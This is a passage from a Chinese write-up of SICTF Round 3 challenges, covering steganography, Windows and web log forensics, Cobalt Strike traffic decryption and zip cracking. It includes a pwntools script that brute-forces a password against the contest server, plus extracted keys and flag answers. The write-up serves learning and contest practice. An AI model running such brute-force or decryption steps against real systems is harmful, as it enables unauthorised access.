<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image004-20240219215834-u4i0iw1.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image004-20240219215834-u4i0iw1.gif" alt="" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image006-20240219215834-w7ebfsk.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image006-20240219215834-w7ebfsk.gif" alt="" loading="lazy"></a>​</p>

<p>2.打开音频文件，查看频谱图记得缩小一下发现一段字符根据jpg图片的文件名猜测是steghide隐写这个是key不过发现不对</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image008-20240219215834-17jpu5q.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image008-20240219215834-17jpu5q.gif" alt="" loading="lazy"></a>​</p>

<ol>
  <li>查看音频文件的文件名 Lagrange is Capatlized提示Lagrange 是大写的</li>
</ol>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image010-20240219215834-c9i90ab.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image010-20240219215834-c9i90ab.gif" alt="" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image012-20240219215834-jum1utt.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image012-20240219215834-jum1utt.gif" alt="" loading="lazy"></a>​</p>

<p>4.解密得到flag</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image014-20240219215834-j78syw1.jpg" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image014-20240219215834-j78syw1.jpg" alt="" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<h3 id="问卷调查"><span class="me-2">问卷调查</span><a href="#问卷调查" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<blockquote>
  <p>??????</p>
</blockquote>

<p>‍</p>

<h3 id="签到签到"><span class="me-2">签到签到</span><a href="#签到签到" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<blockquote>
  <p>扫描微信公众号回复”SICTF{Round3，我来辣~}”获取flag</p>
</blockquote>

<p>‍</p>

<h3 id="geekchallege"><span class="me-2">GeekChallege</span><a href="#geekchallege" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>


<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span>  <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>


<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>

<span class="n">io</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">yuanshen.life</span><span class="sh">'</span><span class="p">,</span><span class="mi">33312</span><span class="p">)</span>

<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Tip:len(array)=5&amp;&amp;len(passwd)=114</span><span class="sh">'</span><span class="p">)</span>

<span class="n">pwd</span> <span class="o">=</span> <span class="sh">''</span>
<span class="n">n</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">s</span> <span class="o">=</span> <span class="p">[]</span>
<span class="c1">#s = 'DDD_J_JDL__DLJDDa'
# DDD_J_JDL__DLJDDa_a_aD_JLJJa_JJJk000000000000000000000000000000000000000000000000000000000000000000000000000000000\n
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">120</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span><span class="mi">127</span><span class="p">):</span>
        <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt;</span><span class="sh">'</span><span class="p">)</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">pwd</span> <span class="o">+</span> <span class="nf">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">114</span><span class="p">,</span><span class="sh">'</span><span class="s">0</span><span class="sh">'</span><span class="p">)</span>
        <span class="nf">sl</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
        <span class="n">t</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvline</span><span class="p">().</span><span class="nf">decode</span><span class="p">()</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">n</span> <span class="o">*</span> <span class="sh">'</span><span class="s">1</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">t</span><span class="p">:</span>
            <span class="n">pwd</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
            <span class="n">n</span> <span class="o">+=</span> <span class="mi">1</span>
            <span class="k">if</span> <span class="nf">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
                <span class="n">s</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="nf">chr</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
            <span class="k">break</span>
    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">==</span> <span class="mi">5</span><span class="p">:</span>
        <span class="k">break</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">pwd</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">120</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
        <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt;</span><span class="sh">'</span><span class="p">)</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">pwd</span> <span class="o">+</span> <span class="n">i</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">114</span><span class="p">,</span><span class="sh">'</span><span class="s">0</span><span class="sh">'</span><span class="p">)</span>
        <span class="nf">sl</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
        <span class="n">t</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvline</span><span class="p">().</span><span class="nf">decode</span><span class="p">()</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">n</span> <span class="o">*</span> <span class="sh">'</span><span class="s">1</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">t</span><span class="p">:</span>
            <span class="n">pwd</span> <span class="o">+=</span> <span class="n">i</span>
            <span class="n">n</span> <span class="o">+=</span> <span class="mi">1</span>
            <span class="k">break</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">pwd</span><span class="p">)</span>


<span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240216104440-vy3y7e0.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240216104440-vy3y7e0.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<h3 id="日志分析1"><span class="me-2">(🩸🩸)日志分析1</span><a href="#日志分析1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>我是先找的计划任务</p>

<p>直接过滤4698</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218154357-v84q6ym.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218154357-v84q6ym.png" alt="image" loading="lazy"></a>​</p>

<p>注意名称不能有斜杠</p>

<div class="table-wrapper"><table>
  <tbody>
    <tr>
      <td>callback</td>
      <td>C:\windows\system32\windows_attack.exe</td>
    </tr>
  </tbody>
</table></div>

<p>这两个答案就找到了</p>

<p>‍</p>

<p>然后就是黑客创建的用户名</p>

<p>过滤4720</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218154552-zupilsj.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218154552-zupilsj.png" alt="image" loading="lazy"></a>​</p>

<p>attack$</p>

<p>‍</p>

<p>接着是黑客添加的用户组</p>

<p>过滤4732</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218154634-e74k4ql.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218154634-e74k4ql.png" alt="image" loading="lazy"></a>​</p>

<p>Administrators</p>

<p>‍</p>

<p>然后就是黑客接入的ip地址</p>

<p>这个需要通过一个工具LogParser.exe</p>

<p>过滤登陆成功的事件</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre> <span class="nc">LogParser</span><span class="mf">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">i</span><span class="o">:</span><span class="no">EVT</span> <span class="s2">"SELECT TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,8,'|') as EventType,EXTRACT_TOKEN(Strings,5,'|') as username,EXTRACT_TOKEN(Strings,18,'|') as Loginip
FROM 1.evtx where EventID=4624"</span>
</pre></td></tr></tbody></table></code></div></div>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218154745-djyu4st.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218154745-djyu4st.png" alt="image" loading="lazy"></a>​</p>

<p>192.168.222.200</p>

<p>‍</p>

<p>最后就是远程登陆用户</p>

<p>根据题目的提示</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218154835-neu0xs6.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218154835-neu0xs6.png" alt="image" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218154927-4tbbc92.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218154927-4tbbc92.png" alt="image" loading="lazy"></a>​</p>

<p>最后的flag</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218154952-1htnkb7.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218154952-1htnkb7.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<h3 id="日志分析2"><span class="me-2">日志分析2</span><a href="#日志分析2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>使用脚本解码一下</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">urllib.parse</span> <span class="kn">import</span> <span class="n">unquote</span>
<span class="n">f</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">access.log.1</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">).</span><span class="nf">readlines</span><span class="p">()</span>
<span class="n">f1</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">1.log</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="p">)</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">dd</span> <span class="o">=</span> <span class="n">i</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span>
    <span class="n">text</span> <span class="o">=</span> <span class="nf">unquote</span><span class="p">(</span><span class="n">dd</span><span class="p">,</span> <span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">f1</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">text</span><span class="o">+</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>在最后一行，我们就可以发现 webshell连接工具的名称和版本号，以及黑客的IP地址</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218155141-ho6rlal.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218155141-ho6rlal.png" alt="image" loading="lazy"></a>​</p>

<p>看最上面发现有大量的请求发往login</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218155321-09tfhq5.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218155321-09tfhq5.png" alt="image" loading="lazy"></a>​</p>

<p>再根据给的提示，四字攻击手法，很明显就是暴力破解</p>

<p>沿着这个爆破的请求翻就可以发现下面的sql注入</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218155430-zbh583d.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218155430-zbh583d.png" alt="image" loading="lazy"></a>​</p>

<p>最后flag是：</p>

<div class="table-wrapper"><table>
  <tbody>
    <tr>
      <td>SICTF{10.11.35.95</td>
      <td>暴力破解</td>
      <td>sqlmap</td>
      <td>1.2.4.18</td>
      <td>蚁剑</td>
      <td>2.1}</td>
    </tr>
  </tbody>
</table></div>

<p>‍</p>

<p>‍</p>

<h3 id="whowhowho"><span class="me-2">WHO?WHO?WHO</span><a href="#whowhowho" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>压缩包密码需要爆破</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218185720-x63cjl9.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218185720-x63cjl9.png" alt="image" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218185749-6owrgqb.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218185749-6owrgqb.png" alt="image" loading="lazy"></a>​</p>

<p>解压得到以下内容</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218185835-wrhsz1d.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218185835-wrhsz1d.png" alt="image" loading="lazy"></a>​</p>

<p>零宽直接在线网站解</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218185904-efsntzi.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218185904-efsntzi.png" alt="image" loading="lazy"></a>​</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="nc">U2FsdGVkX19uvldJ6CGUNff3B28QEdIjZqgUh98K</span><span class="o">+/</span><span class="mi">0</span><span class="nc">J16ELU8WVQydohw4P5</span><span class="o">+</span><span class="mi">2</span><span class="nc">M</span>
<span class="n">jbhTLQHNOpcoOd7kSRgy8pwpovCmimdD8M0IbYUeXjNKYePL</span><span class="o">/</span><span class="nc">WP4PCMaOJHAW3HR</span>
<span class="n">b7IEoDDH1NYh3o5NwMmcFEqy1ujf72VgQIQkaeYFFFE</span><span class="o">=</span>
</pre></td></tr></tbody></table></code></div></div>

<p>rabbit解</p>

<p>密钥为shumu</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218185946-mgycgrb.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218185946-mgycgrb.png" alt="image" loading="lazy"></a>​</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="no">GTAGAGCTAGTCCTT</span><span class="p">{</span><span class="no">GGGTCACGGTTC_GGGTCACGGTTC_GAACGGTTC_GTAGTG_GCTTCA_GTAGACGTGGCGGTG_GTAGACTCA_TATGACCGG_GCTCGGGCT</span><span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>百度一搜</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218190015-ixryswv.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218190015-ixryswv.png" alt="image" loading="lazy"></a>​</p>

<p>说是DNA序列，接着toolsFX工具解</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218190207-l2eyg7i.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218190207-l2eyg7i.png" alt="image" loading="lazy"></a>​</p>

<p>注意一下下划线的位置就行了</p>

<p>SICTF{Q1A0_Q1A0_GA0_SU_N1_SHUMU_SH1_ZHA_NAN}</p>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<h3 id="神秘的流量"><span class="me-2">神秘的流量</span><a href="#神秘的流量" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<ul>
  <li>数据包可以得到这个压缩包</li>
</ul>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218203135-uuvsf7h.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218203135-uuvsf7h.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>用到的工具 脚本</li>
</ul>

<pre><code class="language-url">https://github.com/DidierStevens/Beta/blob/master/cs-extract-key.py

https://github.com/DidierStevens/Beta/blob/master/cs-parse-http-traffic.py
</code></pre>

<blockquote>
  <p>解密cs流量</p>
</blockquote>

<ul>
  <li>使用 <code class="language-plaintext highlighter-rouge">cs-extract-key.py</code>​ 工具 可以得到 <code class="language-plaintext highlighter-rouge">AES key : HMAC key</code>​</li>
</ul>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">python3</span> <span class="n">cs</span><span class="o">-</span><span class="n">extract</span><span class="o">-</span><span class="n">key</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">c</span> <span class="mi">000001</span><span class="n">b01c14d0909382a212e81996ca13bcbcfc9e6396b054f7663e440053e18cf02547016dc37d5f82ea562b8e24d6e69ce890f34dc45f64d3dcd5cb2e5bce3e34d17b4ebd4890a69463ca8c92db79a52f21f8844084eb41aa70fa1b8d047537ba1c898a6437d57b43d99b97bad26c31c0d4f67b768663a459cef8e70d1f1b5ae1656de024c6a0ec66b8d2eb22817451c1a9f924e876b290cbd4b6e0fcc2170bf45b906904b4b0f8ff305064c844308a90d44da3f612b00bdb18c5ad5f1a8f300dc348e0f7aa98c4579dfa297a52b01f1f12709df4939b72e46ce81747e99003d63232e93a0d7397474175a20100d5daaf1c63840c8ce465afeba65d2fc2f43223cf1108bcf09d6daa0096b62c9c89542c257afa98179cbbcbd6729694fbd738cd840bb9efa6ac5e42a89749577efddea42af24abdd3f6af3e001143d2d9995b8dedb3914db8dc00fbf5623116f489164f94b995a995de8a6ded650808c4382247ea5261edb700afb6850280fb45edbbec053f9507faa739b69efd281183127115861bd5ce038244a57047368f72d7c35fd05b2e0381b62b41a7f89f4c948c9b3b987421f2ace96e4d9a362b66c5dc1acd2403</span> <span class="n">dmp</span><span class="p">.</span><span class="n">dmp</span>
</pre></td></tr></tbody></table></code></div></div>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218203440-j59p0je.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218203440-j59p0je.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>然后用 <code class="language-plaintext highlighter-rouge">cs-parse-http-traffic.py</code>​ 就可以拿到明文</li>
</ul>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="c1"># AES key position: 0x003662d8
# AES Key:  e453d7f06b53a1638b0087236bae5d3b
# HMAC key position: 0x003695f8
# HMAC Key: 2bfb11c55658a2050e501c3571ebe676
</span>
<span class="n">python3</span> <span class="n">cs</span><span class="o">-</span><span class="n">parse</span><span class="o">-</span><span class="n">http</span><span class="o">-</span><span class="n">traffic</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">k</span> <span class="mi">2</span><span class="n">bfb11c55658a2050e501c3571ebe676</span><span class="p">:</span><span class="n">e453d7f06b53a1638b0087236bae5d3b</span>  <span class="mf">21.</span><span class="n">pcapng</span> <span class="o">-</span><span class="n">e</span>
</pre></td></tr></tbody></table></code></div></div>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218203731-cg7oqj5.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218203731-cg7oqj5.png" alt="image" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218203914-kvoaejr.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218203914-kvoaejr.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<pre><code class="language-flag">SICTF{b50936c7-b60d-411e-a91f-304937164b9c}
</code></pre>

<p>‍</p>

<blockquote>
  <div class="table-wrapper"><table>
    <tbody>
      <tr>
        <td>参考 [从pcap包中解密cobalt-strike流量</td>
        <td>fdvoid0's blog (fdlucifer.github.io)](https://fdlucifer.github.io/2022/01/05/decrypt-cs-traffic/)</td>
      </tr>
    </tbody>
  </table></div>
</blockquote>

<p>‍</p>

<p>‍</p>

<h3 id="new-year-s-regret"><span class="me-2">(🩸🩸)New Year’ s regret</span><a href="#new-year-s-regret" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<ol>
  <li>根据题目提示掩码爆破出压缩包密码</li>
</ol>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image002-20240219220000-in814aw.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image002-20240219220000-in814aw.gif" alt="" loading="lazy"></a>​</p>

<ol>
  <li>output.txt一堆0 1猜测是0 1转图片在压缩包最底下有一段hex值，直接转不行需要将hex值倒叙一下得到宽高写脚本得到一张图片</li>
</ol>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image004-20240219220000-w2f72uv.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image004-20240219220000-w2f72uv.gif" alt="" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image006-20240219220000-e2crz2z.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image006-20240219220000-e2crz2z.gif" alt="" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image008-20240219220000-gx9u22w.gif" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/clip_image008-20240219220000-gx9u22w.gif" alt="" loading="lazy"></a>​</p>

<p>3.乐谱密码解密得到一部分呢flag</p>

